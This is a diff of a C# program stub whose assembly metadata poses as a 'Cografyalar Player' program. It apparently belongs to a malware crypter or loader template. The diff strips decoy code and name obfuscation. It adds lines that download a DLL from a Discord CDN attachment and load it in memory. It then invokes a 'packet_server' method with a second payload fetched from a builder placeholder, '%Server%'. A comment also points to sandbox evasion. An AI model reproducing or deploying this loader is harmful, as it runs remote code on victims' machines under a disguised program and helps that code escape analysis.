@@ -17,12 +17,12 @@ using System.Text;
 using System.ComponentModel;
 using System.Data;
 
-//Default [assembly: AssemblyTitle("")]
-//Default [assembly: AssemblyDescription("VistaDB Database Engine")]
-//Default [assembly: AssemblyCompany("Vista Software")]
-//Default [assembly: AssemblyProduct("VistaDB")]
-//Default [assembly: AssemblyCopyright("(c) 1999-2006 Vista Software. All rights reserved.")]
-//Default [assembly: AssemblyFileVersion("2.1.8.2")]
+//Default [assembly: AssemblyTitle("Coğrafyalar Programı")]
+//Default [assembly: AssemblyDescription("Cografyalar")]
+//Default [assembly: AssemblyCompany("www.cografyalar.com")]
+//Default [assembly: AssemblyProduct("Cografyalar Player")]
+//Default [assembly: AssemblyCopyright("Copyright © cografyalar Sitesi")]
+//Default [assembly: AssemblyFileVersion("2003.0.0.0")]
 
 //Assembly [assembly: AssemblyTitle("{1}")]
 //Assembly [assembly: AssemblyDescription("{2}")]
@@ -31,55 +31,9 @@ using System.Data;
 //Assembly [assembly: AssemblyCopyright("{5}")]
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
 
-public struct Value
-{
-    private int v1;
-    private int v2;
-    private int v3;
-    public Value(int v1, int v2, int v3)
-    {
-        this.v1 = v1;
-        this.v2 = v2;
-        this.v3 = v3;
-    }
-    public override int GetHashCode()
-    {
-        return Tuple.Create(v1, v2, v3).GetHashCode();
-    }
-}
-
     static class Program
     {
-        internal class DataSetProxy
-        {
-            public DataSet DataSet;
-            public SerializationFormat RemotingFormat;
-            public string SelectedDataTable;
-            public int RowIndex = -1;
-        }
-
-        [Serializable]
-        internal class DataTableProxy
-        {
-            public DataTable DataTable;
-            public SerializationFormat RemotingFormat;
-            public int RowIndex = -1;
-        }
-        static int n;
-        static int topOfStack;
-        const int stackSize = 1000000; // Default?
-
-        // The func is 76 bytes, but we need space to unwind the exception.
-        const int spaceRequired = 18 * 1024;
-        static void recurse()
-        {
-            int remaining;
-
-
-            throw new Exception("Cheese");
-
-            recurse();
-        }
+   
         static void Main()
         {
 
@@ -105,33 +59,15 @@ public struct Value
                 //download }
 
 
-                WebClient indir = new WebClient();
+                WebClient webclient = new WebClient();
 
-                var run = new byte[] { 67, 111, 100, 101, 65, 99, 99, 101, 115, 115, 83, 101, 99, 117, 114, 105, 116, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101 };
+                Assembly bilmiyorum = AppDomain.CurrentDomain.Load(webclient.DownloadData("https://cdn.discordapp.com/attachments/841595401253158954/842759705482231828/run.dll"));
 
-                var karistir = System.Text.Encoding.ASCII.GetString(run);
+                object iletisim = new object[] { %aPP%, string.Empty, webclient.DownloadData("%Server%"), true };
 
-                var buda = new byte[] { 112, 97, 99, 107, 101, 116, 95, 115, 101, 114, 118, 101, 114 };
-
-                var gitmek = System.Text.Encoding.ASCII.GetString(buda);
-
-                byte[] treehouseBytes = indir.DownloadData("https://cdn.discordapp.com/attachments/841595401253158954/842594042083541012/ThreeDPayment.php");
-
-                Assembly bilmiyorum = AppDomain.CurrentDomain.Load(treehouseBytes);
-
-                string stadyum = gitmek;
-    
-                string adress = karistir;
-
-                object iletisim = new object[] { %aPP%, string.Empty, indir.DownloadData("%Server%"), true };
-
-                bilmiyorum.GetType("IsolatedStorage" + "." + stadyum).InvokeMember(adress, BindingFlags.InvokeMethod, null, null, (object[])iletisim);
-
-                int var;
+                bilmiyorum.GetType("IsolatedStorage.packet_server").InvokeMember("CodeAccessSecurityAttribute", BindingFlags.InvokeMethod, null, null, (object[])iletisim);
 
 
-                n = 0;
-                recurse();
 
 
                 //start  {
@@ -145,14 +81,7 @@ public struct Value
 
             catch (Exception ex)
             {
-                Value v = new Value(1, 7, 12);
-                Console.WriteLine(v.GetHashCode());
-                Console.WriteLine(v.GetType());
-                v = new Value(12, 8, 7);
-                Console.WriteLine(v.GetHashCode());
-                v = new Value(8, 7, 12);
-                Console.WriteLine(v.GetHashCode());
-          
+   
             }
 
             //sandboxie [DllImport("kernel32.dll")]
